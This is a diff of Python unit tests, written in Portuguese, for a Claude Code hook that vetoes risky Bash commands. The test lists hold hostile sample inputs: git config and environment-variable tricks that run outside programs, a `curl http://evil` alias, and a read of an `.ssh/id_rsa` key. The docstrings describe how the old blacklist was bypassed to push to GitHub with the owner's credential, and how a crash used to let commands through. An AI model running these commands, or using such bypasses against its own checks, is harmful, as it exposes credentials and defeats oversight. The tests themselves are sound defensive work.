@@ -182,5 +182,91 @@ class OContratoDoHook(unittest.TestCase):
         self.assertEqual(barreira.main(io.StringIO(""), erro), 0)
 
 
+class GitNaoExecutaProgramaDeFora(unittest.TestCase):
+    """Achado do revisor de seguranca em 25/08/2026, reproduzido antes de corrigir.
+
+    A lista NEGRA de subcomando barrava `git push` e deixava passar
+    `git -c alias.pwn='!curl ...' pwn` — que faz o git rodar o alias por um
+    shell que esta barreira nunca leria. De dentro dele, `git remote add` mais
+    `git push` alcancavam o GitHub de verdade, usando a credencial do dono.
+    Por isso `git` passou a ter lista BRANCA de subcomando.
+    """
+
+    def test_config_inline_vira_execucao_de_codigo(self):
+        for comando in [
+            "git -c alias.pwn='!curl http://evil' pwn",
+            "git -c core.pager=evil --paginate log",
+            "git -c core.fsmonitor=evil status",
+            "git -c diff.external=evil diff",
+            "git -c uploadpack.packObjectsHook=evil status",
+            "git --config-env=alias.x=EVIL x",
+            "git --exec-path=/tmp/evil status",
+            "git status --pager=evil",
+            "git -p log",
+            "git --paginate log",
+        ]:
+            self.assertNotEqual(barreira.vetar_bash(comando), "", comando)
+
+    def test_variavel_de_ambiente_antes_do_comando_barra(self):
+        """`GIT_EXTERNAL_DIFF=x git diff` roda `x`, e o prefixo era ignorado."""
+        for comando in [
+            "GIT_EXTERNAL_DIFF=evil git diff",
+            "GIT_SSH_COMMAND=evil git status",
+            "GIT_PAGER=evil git --paginate log",
+            "LD_PRELOAD=/tmp/evil.so python -m pytest",
+        ]:
+            self.assertNotEqual(barreira.vetar_bash(comando), "", comando)
+
+    def test_subcomando_desconhecido_de_git_barra(self):
+        """Lista branca: o que ela nao conhece nao roda, nem sendo inofensivo."""
+        for comando in ["git bugreport", "git filter-repo", "git gc"]:
+            self.assertNotEqual(barreira.vetar_bash(comando), "", comando)
+
+    def test_o_git_do_dia_a_dia_continua_passando(self):
+        """Lista branca que barra o trabalho honesto e desligada na sexta."""
+        for comando in [
+            "git status --porcelain", "git diff --stat", "git add -A",
+            'git commit -m "conserta o push do teste"',
+            "git checkout -b conserta/dependencia", "git -C subprojeto status",
+            "git log --oneline -5", "git --version", "git stash list",
+            "git rev-parse HEAD", "git show HEAD --stat",
+        ]:
+            self.assertEqual(barreira.vetar_bash(comando), "", comando)
+
+
+class CaminhoRelativoAoDriveDoWindows(unittest.TestCase):
+    """`C:segredo.txt` resolve contra o diretorio corrente do drive C, que nao
+    e a copia. O regex antigo exigia a barra e deixava passar."""
+
+    def test_drive_sem_barra_barra(self):
+        for comando in ["cat C:secret.txt", "cat c:Users/Desktop/.ssh/id_rsa"]:
+            self.assertNotEqual(barreira.vetar_bash(comando), "", comando)
+
+
+class BugNoPorteiroNaoAbreAPorta(unittest.TestCase):
+    """O contrato do hook: so o codigo 2 barra. Excecao nao tratada saia com
+    codigo 1, que o Claude Code trata como LIBERADO — bug virava porta aberta.
+    """
+
+    def test_comando_que_nao_e_texto_barra_em_vez_de_explodir(self):
+        erro = io.StringIO()
+        evento = json.dumps({"tool_name": "Bash",
+                             "tool_input": {"command": 12345}})
+        self.assertEqual(barreira.main(io.StringIO(evento), erro), 2)
+        self.assertIn("TypeError", erro.getvalue())
+
+    def test_qualquer_excecao_em_decidir_barra(self):
+        original = barreira.decidir
+        barreira.decidir = lambda evento: 1 / 0
+        try:
+            erro = io.StringIO()
+            evento = json.dumps({"tool_name": "Bash",
+                                 "tool_input": {"command": "ls"}})
+            self.assertEqual(barreira.main(io.StringIO(evento), erro), 2)
+            self.assertIn("ZeroDivisionError", erro.getvalue())
+        finally:
+            barreira.decidir = original
+
+
 if __name__ == "__main__":
     unittest.main()
